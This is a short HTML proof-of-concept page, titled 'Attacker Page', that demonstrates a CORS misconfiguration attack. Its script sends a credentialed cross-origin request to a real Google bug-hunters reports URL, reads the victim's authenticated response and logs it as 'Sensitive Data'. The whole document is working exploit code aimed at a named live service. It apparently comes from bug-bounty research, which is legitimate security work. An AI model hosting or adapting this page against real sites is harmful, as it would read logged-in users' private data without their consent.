<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Attacker Page</title>
</head>
<body>
    <h1>Exploiting CORS</h1>
    <button id="exploit">Exploit CORS</button>

    <script>
        document.getElementById('exploit').addEventListener('click', function () {
            fetch('https://bughunters.google.com/report/reports', {
                method: 'GET',
                credentials: 'include'
            })
            .then(response => response.text())
            .then(data => {
                console.log("Sensitive Data:", data);
                alert('Exploit Successful! Check the console for sensitive data.');
            })
            .catch(error => console.error('Error:', error));
        });
    </script>
</body>
</html>
